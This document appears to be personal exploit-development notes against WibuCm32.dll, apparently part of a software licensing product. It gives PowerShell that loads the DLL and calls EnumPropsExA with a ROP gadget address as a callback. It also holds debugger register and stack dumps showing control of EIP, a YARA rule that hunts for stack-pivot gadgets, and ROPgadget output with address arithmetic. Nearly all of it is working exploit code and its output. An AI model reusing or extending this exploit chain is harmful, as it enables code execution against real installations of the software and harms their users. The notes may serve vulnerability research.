LoadLibrary script
```powershell
function LoadLibrary  
{
 param  
 (  
 [Parameter(Mandatory = $true)]  
 [string]  
 $ModuleName  
 )  
  
 $SUCCESS = $kernel32::LoadLibrary($ModuleName); $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()  
  
 if($SUCCESS -eq $null)  
 {  
 throw "[LoadLibrary]: Error: $(([ComponentModel.Win32Exception] $LastError).Message)"  
 }  
  
 Write-Output $SUCCESS  
}
```

Other LoadLibrary script
```powershell
function testload {
     Add-Type -TypeDefinition @"
     using System;
     using System.Diagnostics;
     using System.Runtime.InteropServices;

     public static class Kernel32
     {
         [DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
             public static extern IntPtr LoadLibrary(
                 [MarshalAs(UnmanagedType.LPStr)]string lpFileName);

         [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
             public static extern IntPtr GetProcAddress(
                 IntPtr hModule,
                 string procName);
     }

"@
$LibHandle = [Kernel32]::LoadLibrary("WibuCm32.dll")
write-output $LibHandle
}
PS C:\Windows\SysWOW64\WindowsPowerShell\v1.0> testload
1729560576 #in hex: 0x67170000
```



|base address  | weird offset | ropgadget address  | final address |
|---|---|---|---|
|0x67170000  |    0x0c00   |   0x0004f369  |  0x671bff69|


PoC stack pivot ROP start
```powershell
function Update-EnumPropsExA{
	$sig = @"

[DllImport("user32.dll", EntryPoint="EnumPropsExA")]
public static extern int EnumPropsExA( uint hwind, uint lpfunc, string lParam);

const int HWIND =  0x20592;
const int LPFUNC = 0x671bff69;
const string LPARAM = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";

public static void UpdateEnumPropsExA(){
	uint i;
	int outval;
	uint tmp = 0x00ffffffff;
	for (i = 0x00000011; i < tmp; i++){
		outval = EnumPropsExA(i, LPFUNC, LPARAM);
		if (outval == 1337){
			break;
			}
		}
}
"@
	Add-Type -MemberDefinition $sig -Name EnumPropsExASPI -Namespace User32
	[User32.EnumPropsExASPI]::UpdateEnumPropsExA()
}
```


Registers
```bash
EAX : 0CE37FED
EBX : 079CC550     "\nÀ"
ECX : 671BFF69     wibucm32.671BFF69
EDX : FFFFFFFF
EBP : 0922E51C
ESP : 0922E548     "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
ESI : 671BFF69     wibucm32.671BFF69
EDI : 0000003A     ':'
EIP : 61616161     mscorlib.ni.61616161
EFLAGS : 00000206     L'Ȇ'
```


Stack
```bash
0922E538  671BFF69  return to wibucm32.671BFF69 from wibucm32.671E4271
0922E53C  0922E540  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
0922E540  61616161  mscorlib.ni.61616161 
0922E544  61616161  mscorlib.ni.61616161
0922E548  61616161  mscorlib.ni.61616161 <--esp
0922E54C  61616161  mscorlib.ni.61616161
0922E550  61616161  mscorlib.ni.61616161
0922E554  61616161  mscorlib.ni.61616161
0922E558  61616161  mscorlib.ni.61616161
0922E55C  61616161  mscorlib.ni.61616161
0922E560  61616161  mscorlib.ni.61616161
0922E564  61616161  mscorlib.ni.61616161
0922E568  61616161  mscorlib.ni.61616161
0922E56C  61616161  mscorlib.ni.61616161
0922E570  61616161  mscorlib.ni.61616161
0922E574  61616161  mscorlib.ni.61616161
0922E578  61616161  mscorlib.ni.61616161
0922E57C  61616161  mscorlib.ni.61616161
0922E580  61616161  mscorlib.ni.61616161
0922E584  61616161  mscorlib.ni.61616161
0922E588  61616161  mscorlib.ni.61616161
0922E58C  61616161  mscorlib.ni.61616161
```

Disasm
```bash
61616161 | 67:0200                  | add al,byte ptr ds:[bx+si]              | <-eip
61616164 | 94                       | xchg esp,eax                            |
61616165 | 23EC                     | and ebp,esp                             |
61616167 | 9B                       | fwait                                   |
61616168 | 5F                       | pop edi                                 |
61616169 | 0000                     | add byte ptr ds:[eax],al                |
6161616B | 0091 00088A04            | add byte ptr ds:[ecx+48A0800],dl        |
61616171 | 00AD 67020096            | add byte ptr ss:[ebp-69FFFD99],ch       |
61616177 | 2350 9E                  | and edx,dword ptr ds:[eax-62]           |
```



If we go byonde 0x100 length in our string it will get placed on the heap....
to access it we need:

```bash
import "pe"

rule test
{
  strings:
    $pivot = {83 c4 10 c3}
  condition:
    $pivot in ((pe.sections[pe.section_index(".text")].raw_data_offset)..(pe.sections[pe.section_index(".text")].raw_data_offset + pe.sections[pe.section_index(".text")].raw_data_size))
}
```
So many results ....


Picking one

```bash
┌──(kali㉿kali)-[~/mquery/samples]
└─$ /usr/local/bin/ROPgadget --binary WibuCm32.dll --rawArch=x86 --rawMode=32 | grep 'add esp, 0x10' 

```


Adjusting the address

| base address  | weird offset | ropgadget address  | final address |
|---|---|---|---|
|0x67170000|0x0c00|0x00013f80|0x67184B80|


```bash
67184B80 | 83C4 10                  | add esp,10                              |
67184B83 | C3                       | ret                                     |
```